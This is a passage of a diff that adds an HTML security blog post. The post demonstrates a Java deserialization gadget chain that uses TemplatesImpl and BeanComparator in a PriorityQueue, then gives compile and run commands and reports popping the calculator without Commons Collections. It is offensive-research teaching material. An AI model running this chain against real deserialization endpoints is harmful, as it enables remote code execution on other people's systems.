+        <span style="color: #cf8e6d;">Field</span> nameField = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
+        nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
+
+        <span style="color: #cf8e6d;">Field</span> tfacname = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
+        tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        tfacname.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">TransformerFactoryImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
+
+        <span style="color: #7a7e85;">// So the exploit creation is extremely same as CC2. Simply instead of InvokerTransFormer and TrasformingComparator we will be using BeanComparator</span>
+        <span style="color: #cf8e6d;">BeanComparator</span> bc = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">BeanComparator</span>(<span style="color: #6aab73;">"outputProperties"</span>, <span style="color: #cf8e6d;">Collections</span>.<span style="color: #56a8f5;">reverseOrder</span>());
+        <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">TemplatesImpl</span>&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">TemplatesImpl</span>&gt;(<span style="color: #b3ae60;">2</span>, bc);
+        priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+        priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+    }
+}</pre></div>
+
+<p>The above code can be compiled using:</p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">javac -cp <span style="color: #6aab73;">".;commons-beanutils-1.9.2.jar;commons-logging-1.2.jar;javassist-3.12.1.GA.jar;xalan-2.7.3.jar"</span> hello.java</pre></div>
+
+<p>and executed using:</p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">java -cp <span style="color: #6aab73;">".;commons-beanutils-1.9.2.jar;commons-logging-1.2.jar;javassist-3.12.1.GA.jar;xalan-2.7.3.jar"</span> hello</pre></div>
+
+
+<img src="images/beyoncommonsCollection/nocc.png">
+<p>As you can see, we do not have Commons Collections in our classpath but we are still able to pop the calculator.</p>
+
+    <p>That's it for today.</p>
+    <p>Thanks for reading.</p>
+    <p>Happy Hacking.</p>
+    <p>You can connect with me at:</p>
+    <p><a href="https://www.linkedin.com/in/swagatkumar/">LinkedIn</a></p>
+    <p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+  </main>
+</body>
+</html>
